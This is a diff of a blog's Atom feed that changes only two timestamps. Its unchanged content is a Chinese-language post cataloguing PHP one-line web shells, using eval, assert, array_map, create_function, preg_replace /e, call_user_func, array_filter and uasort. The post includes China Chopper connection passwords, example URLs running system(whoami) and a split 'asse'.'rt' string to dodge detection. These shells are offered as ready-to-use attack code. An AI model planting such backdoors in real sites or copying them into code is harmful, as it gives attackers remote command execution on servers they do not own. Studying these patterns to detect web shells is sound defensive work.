@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://ygnight.xyz/"/>
-  <updated>2020-01-17T08:30:16.226Z</updated>
+  <updated>2020-01-17T08:47:36.883Z</updated>
   <id>http://ygnight.xyz/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://ygnight.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
     <id>http://ygnight.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</id>
     <published>2020-01-13T08:20:20.808Z</published>
-    <updated>2020-01-17T08:30:16.226Z</updated>
+    <updated>2020-01-17T08:47:36.883Z</updated>
     
     <content type="html"><![CDATA[<h2 id="1、eval-函数"><a href="#1、eval-函数" class="headerlink" title="1、eval()函数"></a>1、eval()函数</h2><pre><code>1.#eval() 函数把字符串按照 PHP 代码来计算2.#常见一句话：3.&lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;</code></pre><h2 id="2、assert-函数"><a href="#2、assert-函数" class="headerlink" title="2、assert()函数"></a>2、assert()函数</h2><pre><code>1.#与eval类似2.#常见一句话3.&lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;</code></pre><h2 id="3、array-map-函数"><a href="#3、array-map-函数" class="headerlink" title="3、array_map()函数"></a>3、array_map()函数</h2><pre><code>#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。#命令执行http://localhost/123.php?func=system   cmd=whoami#菜刀连接http://localhost/123.php?func=assert   密码：cmd$func=$_GET[&apos;func&apos;];$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;$new_array=array_map($func,$array);echo $new_array;</code></pre><h2 id="4、create-function-函数"><a href="#4、create-function-函数" class="headerlink" title="4、create_function()函数"></a>4、create_function()函数</h2><pre><code>#创建匿名函数#执行命令和上传文件参考eval函数(必须加分号)。#菜刀连接密码：cmd$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();</code></pre><h2 id="5、preg-replace-函数"><a href="#5、preg-replace-函数" class="headerlink" title="5、preg_replace()函数"></a>5、preg_replace()函数</h2><pre><code>#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;)#执行命令和上传文件参考assert函数(不需要加分号)。#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code></pre><h2 id="6、call-user-func-函数"><a href="#6、call-user-func-函数" class="headerlink" title="6、call_user_func()函数"></a>6、call_user_func()函数</h2><pre><code>#传入的参数作为assert函数的参数#cmd=system(whoami)#菜刀连接密码：cmdcall_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);</code></pre><h2 id="7、call-user-func-array-函数"><a href="#7、call-user-func-array-函数" class="headerlink" title="7、call_user_func_array()函数"></a>7、call_user_func_array()函数</h2><pre><code>#将传入的参数作为数组的第一个值传递给assert函数#cmd=system(whoami)#菜刀连接密码：cmd$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);</code></pre><h2 id="8、array-filter-函数"><a href="#8、array-filter-函数" class="headerlink" title="8、array_filter()函数"></a>8、array_filter()函数</h2><pre><code>#用回调函数过滤数组中的元素：array_filter(数组,函数)#命令执行func=system&amp;cmd=whoami#菜刀连接http://localhost/123.php?func=assert  密码cmd$cmd=$_POST[&apos;cmd&apos;];$array1=array($cmd);$func =$_GET[&apos;func&apos;];array_filter($array1,$func);</code></pre><h2 id="9、uasort-函数"><a href="#9、uasort-函数" class="headerlink" title="9、uasort()函数"></a>9、uasort()函数</h2><pre><code>#php环境&gt;=&lt;5.6才能用#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmdusort($_GET,&apos;asse&apos;.&apos;rt&apos;);</code></pre>]]></content>
     
